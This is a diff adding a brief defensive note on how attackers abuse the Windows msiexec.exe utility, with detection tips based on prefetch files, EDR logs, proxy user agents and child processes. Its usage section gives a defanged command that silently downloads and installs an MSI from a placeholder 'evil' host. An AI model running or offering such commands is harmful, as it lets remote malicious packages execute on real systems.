@@ -1,0 +1,13 @@
+MSIEXEC.exe is a Windows installer utility to install MSI or MSP packages.Adversaries will use these utilities to download 
+and execute malicious MSI files 
+
+
+Usage:
+MSIEXEC /j m evil[.]msi
+msiexec /q /i http[:]//evil/evil[.]msi 
+
+Detection:
+1.Look for MSIEXEC.exe prefetch files and Parsing the prefetch will provide the executed file. 
+2.Command execution and arguments passed to msiexec.exe using EDR solutions.
+3.Look for the HTTP useragents with msiexec in the network recorders or the proxy logs.
+4.Look for suspicious process in the system with parent process as MSIEXEC.
